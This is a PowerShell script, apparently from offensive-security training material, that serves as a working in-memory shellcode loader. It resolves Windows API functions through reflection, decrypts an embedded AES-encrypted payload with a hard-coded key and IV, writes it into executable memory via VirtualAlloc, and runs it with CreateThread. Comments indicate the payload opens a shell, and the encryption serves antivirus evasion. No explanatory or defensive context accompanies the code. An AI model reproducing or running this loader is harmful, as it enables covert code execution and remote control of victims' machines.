function LookupFunc {
    Param (
        $moduleName, 
        $functionName
    )
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    # Creates our assembly and defines the module and type
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    
    # Sets up the constructor
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    # Sets up the invoke method
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    # Done
    return $type.CreateType()
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 128
    $aes.BlockSize = 128

    # Keep this in mind when you view your decrypted content as the size will likely be different
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros

    $aes.key = $Key
    $aes.IV = $IV

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
    $aes.Dispose()
    return $decrypted
}

# Allocate our memory buffer
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Encrypted Payload
[Byte[]]$Offsec = 
0x46,0x6b,0xdc,0xd9,0x3e,0xc2,0xbf,0x39,0x17,0x4c,0x06,0x71,0xec,0x93,0x2a,
0x2b,0xf4,0x69,0x59,0x0a,0x75,0x0a,0xe9,0xd7,0x74,0xbb,0x9f,0xf2,0x09,0x09,
0x66,0xff,0x50,0xa1,0xc2,0x61,0x85,0x08,0x81,0x6d,0x09,0xd7,0x6a,0x1b,0x2e,
0x3b,0xc7,0x15,0x7a,0x20,0xb6,0xa4,0x6f,0xd8,0xf9,0x6a,0x28,0xb2,0x6a,0xff,
0x2c,0xeb,0xba,0x33,0xf6,0x76,0x37,0xac,0x17,0xed,0x9c,0xe0,0x50,0x08,0x50,
0x7a,0x42,0x64,0x27,0x6a,0x81,0xd9,0xe4,0x21,0xc9,0xff,0x4c,0x54,0x85,0x25,
0xc8,0xc3,0x5b,0xcb,0xea,0x35,0xbc,0xd8,0x31,0xa2,0x68,0x00,0x0d,0x06,0xeb,
0xab,0x03,0x44,0x08,0xdd,0x0e,0x68,0xb5,0x6f,0x71,0x13,0x7d,0x6a,0x42,0xff,
0x8d,0x0f,0x52,0xfd,0x5a,0x39,0x5c,0xd3,0xf7,0xfa,0xdf,0xc1,0xa8,0x1d,0xf9,
0x3f,0x0b,0x67,0x18,0xa6,0x60,0x95,0x88,0x2a,0x89,0xca,0x88,0x7f,0x32,0x49,
0x78,0x98,0x87,0x16,0x51,0x7d,0x06,0xc4,0x6b,0x02,0x88,0x48,0x53,0x3f,0x7c,
0x70,0xc1,0x70,0xc3,0xf1,0xf9,0xa9,0xc1,0xf2,0x7a,0xe5,0xa4,0x82,0x33,0x63,
0x96,0x3d,0x65,0x30,0x71,0x32,0xaf,0x28,0x8d,0x2a,0x58,0xd8,0xf1,0xa6,0x75,
0xf4,0x1b,0x9d,0x3c,0x71,0x16,0x61,0x18,0x1b,0xa1,0xd5,0x5c,0x87,0x82,0x76,
0x5b,0x2a,0x3b,0x4d,0x2f,0xea,0xd7,0xdc,0xb9,0xff,0x27,0x8c,0xa0,0x35,0x4f,
0x4b,0x28,0xbb,0xa8,0x2b,0xb9,0x9a,0x16,0x6e,0xbb,0x3f,0x46,0x0a,0x9e,0x50,
0xb0,0xd6,0xad,0xca,0xc3,0x04,0x35,0xd7,0xc6,0xdf,0x0d,0x4d,0xb1,0xf5,0x77,
0x03,0x3b,0x8b,0xdb,0xe0,0xb1,0xe8,0xd8,0xab,0xf9,0x5b,0x68,0xaa,0x40,0x1f,
0xa8,0x26,0x67,0x1d,0xf8,0x1e,0xbd,0x89,0x91,0x33,0x30,0x2f,0xeb,0x1f,0xa1,
0x3f,0x96,0xd1,0x4e,0xe1,0xc3,0xb1,0x81,0x8a,0xec,0xc2,0x92,0x6b,0x88,0x61,
0x3e,0x9b,0x21,0xee,0x4c,0xb7,0x23,0x3e,0xce,0xd1,0x91,0x33,0x0f,0xef,0x66,
0x88,0x1a,0x0d,0xc3,0x07,0x70,0xf0,0xd6,0x84,0x20,0xec,0x72,0x5a,0xfb,0x25,
0x90,0x6b,0x55,0x91,0xc0,0x06,0x49,0x39,0x35,0x73,0x6a,0x9c,0x30,0x0a,0x3b,
0x8a,0x7b,0x8b,0x41,0x36,0x43,0xc8,0x6b,0x17,0x1b,0x7d,0x4c,0x3a,0x00,0x3b,
0x9e,0x2d,0x4e,0x39,0x1f,0x55,0x92,0xeb,0x0f,0x49,0x7c,0xa9,0xf5,0x2e,0x3c,
0x0d,0xa1,0x18,0x2e,0x02,0x6b,0xe3,0x02,0x98,0x4a,0xd2,0xbe,0x8c,0x8b,0x0a,
0x67,0x5f,0x39,0x41,0xdc,0xfb,0x9c,0x3b,0x03,0x64,0xca,0x9d,0x17,0xa9,0xf2,
0x06,0xc9,0x5d,0x10,0x5c,0x15,0x82,0x96,0x4d,0xca,0x57,0xe5,0xd2,0x45,0x61,
0xbb,0x6c,0x5c,0x74,0x98,0xd7,0x5b,0x7c,0x4d,0x80,0xb1,0xba,0x82,0x52,0xc3,
0x13,0xb0,0x5a,0xfd,0x70,0x58,0x89,0x90,0x2b,0x30,0x60,0x7a,0xe2,0xf7,0x60,
0x65,0x38,0xb6,0x4b,0x47,0xa6,0xe9,0xdb,0xdd,0x17,0x6f,0xa6,0xf0,0xd0,0xab,
0x74,0xbd,0x92,0x31,0xaf,0x55,0xf9,0x37,0x44,0x43,0xaa,0x6d,0xf3,0x64,0xa2,
0xd5,0x70,0x1e,0x4c,0x36,0x06,0xec,0xde,0x02,0xb6,0xe2,0x5c,0xf7,0xa0,0x96,
0x9f,0xb9,0xe4,0x5f,0x3d,0x05,0x21,0xcb,0xf2,0x99,0xb6,0xc0,0x4c,0x44,0x5c,
0x69,0xf2,0x7a,0xc0,0x0d,0xa7,0x09,0xf6,0xb8,0xac,0x43,0x81,0xb6,0x07,0x80,
0x73,0xc5,0x33,0xaa,0x1d,0xa1,0xdc,0x0f,0x49,0x5f,0x50,0xb8,0x41,0x3f,0x13,
0x58,0x6b,0x95,0x09,0xe8,0x97,0xf2,0x1d,0xe3,0x39,0x5e,0x07,0xb1,0x38,0xc8,
0xe8,0x8e,0x72,0xa0,0xb9,0xb8,0xaf,0x16,0x52,0x19,0x65,0x75,0x48,0xbb,0xb7,
0xfe,0xcc,0x2d,0xaf,0xe1,0xcf,0x12,0x56,0x69,0xce,0x15,0x6f,0xae,0x00,0x69,
0x64,0x88,0x16,0x86,0x28,0xda,0x32,0xaa,0x23,0xad,0xa9,0x8b,0xd0,0x0a,0x9c,
0x65,0xda,0xc3,0xc8,0x72,0xcf,0x6e,0x7f,0x82,0x6c,0xb3,0x24,0x91,0x73,0x67,
0x1e,0x25,0x6a,0x6d,0xb2,0x22,0x66,0xea,0x41,0x28,0xef,0xa5,0x29,0x2f,0x3a,
0xaa,0x38,0x04,0xd3,0x05,0xb1,0x99,0x5c,0xb4,0x00

# Key
[Byte[]]$Says = 
0xbe,0x18,0xfd,0xe4,0xaf,0x91,0x18,0x71,0xcc,0x26,0xde,0x78,0x96,0x7f,0x9e,
0x8d

# IV
[Byte[]]$TryHarder = 
0x30,0x84,0x61,0x75,0x58,0x11,0x4e,0x0e,0xab,0xa5,0x65,0x42,0x2c,0xf0,0x4c,
0x18

# Decrypt our shellcode
$buf = Decrypt-Bytes -Bytes $Offsec -Key $Says -IV $TryHarder

# Copy our shellcode into the buffer
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Create an execution thread using the instructions at the memory address of our shellcode
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Execute our thread and ensure it doesn't exit until we close our shell
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)   
